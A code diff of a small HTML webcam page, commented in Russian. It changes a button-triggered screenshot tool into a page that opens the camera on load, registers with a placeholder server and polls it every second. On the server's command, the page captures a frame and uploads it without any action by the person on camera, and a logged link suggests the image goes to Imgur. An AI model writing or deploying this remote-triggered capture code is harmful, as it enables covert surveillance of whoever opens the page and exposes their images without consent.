@@ -2,64 +2,69 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Webcam Screenshot</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webcam Access</title>
 </head>
 <body>
-    <h1>Webcam Screenshot for Discord</h1>
-    <p>Enter your Discord User ID: <input type="text" id="userId" placeholder="Your Discord ID"></p>
-    <video id="video" autoplay style="display:none;"></video>
+    <h1>Webcam Snapshot</h1>
+    <video id="webcam" autoplay playsinline width="640" height="480"></video>
     <canvas id="canvas" style="display:none;"></canvas>
-    <button onclick="takeScreenshot()">Take Screenshot</button>
-
     <script>
+        let stream = null;
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Запрашиваем доступ к веб-камере
         async function startWebcam() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
+                // Отправляем сигнал серверу, что доступ к камере получен
+                fetch('YOUR_SERVER_URL/register', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ userId: 'USER_ID' }) // Замените на уникальный ID
+                });
             } catch (err) {
-                console.error("Error accessing webcam: ", err);
-                alert("Please allow webcam access.");
+                console.error('Ошибка доступа к веб-камере:', err);
+                alert('Не удалось получить доступ к веб-камере.');
             }
         }
 
-        async function takeScreenshot() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
+        // Делаем снимок и отправляем на сервер
+        async function takeSnapshot() {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-
-            const image = canvas.toDataURL('image/jpeg');
-            const userId = document.getElementById('userId').value;
-
-            if (!userId) {
-                alert("Please enter your Discord User ID.");
-                return;
+            context.drawImage(video, 0, 0);
+            const dataUrl = canvas.toDataURL('image/jpeg');
+            try {
+                const response = await fetch('YOUR_SERVER_URL/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: dataUrl, userId: 'USER_ID' })
+                });
+                const result = await response.json();
+                console.log('Ссылка на Imgur:', result.link);
+            } catch (err) {
+                console.error('Ошибка при загрузке:', err);
             }
-
-            // Отправляем снимок на сервер
-            fetch('https://your-server-url/upload', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image, userId })
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert("Screenshot sent to server!");
-                console.log('Success:', data);
-            })
-            .catch(err => {
-                alert("Error sending screenshot.");
-                console.error('Error:', err);
-            });
-
-            // Выключаем вебкамеру
-            video.srcObject.getTracks().forEach(track => track.stop());
         }
 
-        // Запускаем вебкамеру при загрузке страницы
-        window.onload = startWebcam;
+        // Проверяем запросы от сервера
+        function pollForSnapshot() {
+            setInterval(async () => {
+                const response = await fetch('YOUR_SERVER_URL/check?userId=USER_ID');
+                const data = await response.json();
+                if (data.takeSnapshot) {
+                    takeSnapshot();
+                }
+            }, 1000); // Проверяем каждую секунду
+        }
+
+        // Запускаем веб-камеру и опрос
+        startWebcam();
+        pollForSnapshot();
     </script>
 </body>
 </html>
